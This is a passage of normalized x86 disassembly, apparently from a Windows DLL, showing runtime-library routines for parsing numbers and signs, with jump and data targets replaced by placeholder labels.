push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_1003f681
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1001c0be
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_10023f1f
retn 0x20
sub_10042429
push 0x54
mov eax sub_1004840c
call sub_10023e9c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_1003f681
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1001c127
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_10023f1f
retn 0x20
sub_100424d1
push 0x38
mov eax sub_10048bbe
call sub_10023e9c
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1003f331
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10007b41
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bb94
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_10023f1f
retn 0x20
sub_10042587
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1003ae01
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004001d
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x18
sub_100425f5
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1003ae01
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004001d
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x18
sub_10042663
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1003ae01
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004001d
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x1c
sub_100426d4
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1003ae01
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004001d
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x1c
sub_10042745
mov edi edi
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x84 ] ecx
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
mov [ ebp - 0x88 ] eax
push edi
mov eax 0x2000
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
fld [ ebp + 0x1c ]
sub edi [ ebp - 0x8 ]
mov edx ecx
and edx 0x3000
mov [ ebp - 0x80 ] ebx
cmp edx eax
jne r-xdata
mov [ ebp - 0x8 ] edi
push 0x6
pop ecx
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x84 ]
call sub_10037e5a
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1002088b
push eax
push edi
push ebx
push [ ebp - 0x80 ]
lea eax [ ebp - 0x78 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x88 ]
push [ ebp - 0x84 ]
call sub_1003fbd1
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x88 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x1c
fld [ r--data ]
fmul st1
fucomp st1
fnstsw ax
test ah 0x44
jpo r-xdata
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov [ ebp - 0x79 ] bl
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
fchs
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx 0x1388
jae r-xdata
sub edi edx
fmul st1
add ebx edx
jmp r-xdata
sub_100428b8
mov edi edi
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ecx
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x8c ] eax
push edi
mov eax 0x2000
test ecx ecx
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
sub edi [ ebp - 0x8 ]
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ ebp - 0x8 ] edi
push 0x6
pop ecx
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
fld [ r--data ]
push ebx
fcom st1
push 0xa
mov ebx 0x1388
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] ebx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
pop ebx
je r-xdata
cmp edi edx
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x88 ]
call sub_10037e5a
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1002088b
push eax
push edi
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x8c ]
push [ ebp - 0x88 ]
call sub_1003fbd1
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8c ]
add esp 0x44
pop edi
xor ecx ebp
pop esi
call sub_10020040
leave
retn 0x1c
fchs
jmp r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ ebp - 0x84 ] ebx
jae r-xdata
sub edi edx
fmul st1
add [ ebp - 0x84 ] edx
jmp r-xdata
sub_10042a28
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_1002088b
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_1004001d
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x18
sub_10042a85
push 0x54
mov eax sub_10048441
call sub_10023e9c
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x60 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x5c ] ebx
call sub_10040209
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_1003a3ed
add esp 0xc
lea ecx [ ebp - 0x48 ]
movzx ebx ax
call sub_10007ee2
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006a43
xor esi esi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1003b482
cmp [ eax ] bx
jb r-xdata
or [ edi ] 0x2
jmp r-xdata
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10005af7
push esi
lea ecx [ ebp - 0x2c ]
call sub_1003b482
movzx eax [ eax ]
movzx ecx bx
add ecx 0x9
cmp ecx eax
jge r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_1003bd13
mov eax ebx
call sub_10023f1f
retn 0x24
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov [ ebp - 0x49 ] 0x30
sub [ ebp - 0x49 ] bl
cmp esi [ ebp - 0x18 ]
jae r-xdata
lea eax [ ebp - 0x50 ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x50 ] ebx
call sub_1001c127
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x44 ]
push esi
lea ecx [ ebp - 0x2c ]
call sub_1003b482
mov al [ eax ]
add al [ ebp - 0x49 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x58 ] al
push [ ebp - 0x58 ]
push 0x1
call sub_10005af7
inc esi
cmp esi [ ebp - 0x18 ]
jb r-xdata
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x50 ] ebx
jne r-xdata
mov eax [ ebp - 0x60 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100023ce
mov ebx [ ebp - 0x5c ]
sub_10042bd7
push 0x20
mov eax sub_1004846e
call sub_10023e9c
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10040209
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1003c2b5
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_1003bd13
mov eax edi
call sub_10023f1f
retn 0x24
sub_10042c56
push 0x54
mov eax sub_1004849b
call sub_10023e9c
fldz
xor ebx ebx
fcomp [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x60 ] bl
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x58 ] ebx
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jpe r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] 0x1
fchs
fstp [ ebp + 0x20 ]
lea ecx [ ebp - 0x54 ]
fstp st0
call sub_1003c01f
fld [ ebp + 0x20 ]
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_1002088b
add esp 0x14
xor esi esi
cmp eax ebx
mov [ ebp - 0x5c ] eax
jle r-xdata
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_1003a3ed
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_1003c19b
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_1003c948
push [ ebp - 0x60 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10040a87
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1003bd13
mov eax [ ebp + 0x8 ]
call sub_10023f1f
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_1003a3ed
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1003c19b
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
fld [ ebp + 0x20 ]
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fstp [ ebp + 0x20 ]
fld [ ebp + 0x20 ]
fcomp st1
fnstsw ax
test ah 0x1
je r-xdata
sub_10042d76
push 0x2c
mov eax sub_100484c8
call sub_10023e9c
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x34 ] edi
add edi 0x8
push edi
push 0x0
push 0x30
call sub_1003a3ed
add esp 0xc
cmp [ esi + 0x18 ] 0x8
movzx ebx ax
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
movzx eax [ esi ]
cmp bx ax
ja r-xdata
inc esi
mov [ ebp - 0x30 ] 0x1
inc esi
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x30 ] 0x0
call sub_1003a3ed
add esp 0xc
cmp [ esi ] ax
jne r-xdata
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1003c8cd
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
movzx ecx bx
movzx eax ax
add ecx 0x9
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x38 ] esp
push eax
call sub_1003c948
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10040a87
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003bd13
mov eax [ ebp + 0x8 ]
call sub_10023f1f
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003c19b
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_10042e4c
push 0x4
mov eax sub_100488b7
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_10040fd5
mov eax esi
call sub_10023f0b
retn 0x8
sub_10042e7f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x24 ]
mov eax [ ecx ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x20
sub_10042ec0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10042ea8
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10042ee1
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
lea ebx [ eax + 0x14 ]
push ebx
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ebx
call sub_1003a3ed
add esp 0xc
push [ ebp - 0x28 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea edi [ ebp - 0x24 ]
call sub_1003bad8
test al al
jne r-xdata
push [ ebp - 0x28 ]
xor bl bl
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push 0x0
push 0x2b
call sub_1003a3ed
add esp 0xc
mov ecx esi
mov bx ax
call sub_1003bc51
cmp ax bx
jne r-xdata
push [ ebp - 0x28 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_1003bc51
cmp ax [ ebp - 0x2c ]
jne r-xdata
push [ ebp - 0x34 ]
push 0x0
push 0x2d
call sub_1003a3ed
add esp 0xc
mov ecx esi
mov bx ax
call sub_1003bc51
cmp ax bx
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ecx esi
call sub_1003bc51
cmp [ ebp - 0x2c ] ax
ja r-xdata
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ecx esi
mov bl 0x1
call sub_1003b9f8
push [ ebp - 0x28 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp - 0x24 ] 0x2d
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_1003b9f8
mov ecx esi
call sub_1003bc51
movzx ecx [ ebp - 0x2c ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0xa
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ edi ] 0x0
mov [ ebp - 0x30 ] ebx
call sub_1001bd2f
add esp 0x10
push [ ebp - 0x28 ]
mov ecx esi
mov edi eax
call sub_1003bad8
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov ecx esi
call sub_1003bc51
mov cl 0x30
sub cl [ ebp - 0x2c ]
add al cl
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x3c ] eax
je r-xdata
inc ebx
mov ecx esi
mov bl 0x1
call sub_1003b9f8
inc edi
or ebx 0x2
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
sub_1004307b
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_1003a3ed
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10042ee1
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0x4 ]
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003b9f8
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10042ee1
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003b9f8
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10042ee1
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_1004313f
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_1003a3ed
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_1003a3ed
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_1003a3ed
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_1003a3ed
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_1003a3ed
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
mov ebx [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042e7f
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp + 0xc ]
call sub_1003bc51
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003b9f8
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0x10 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003b9f8
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0x14 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
lea eax [ ebx + 0x10 ]
push eax
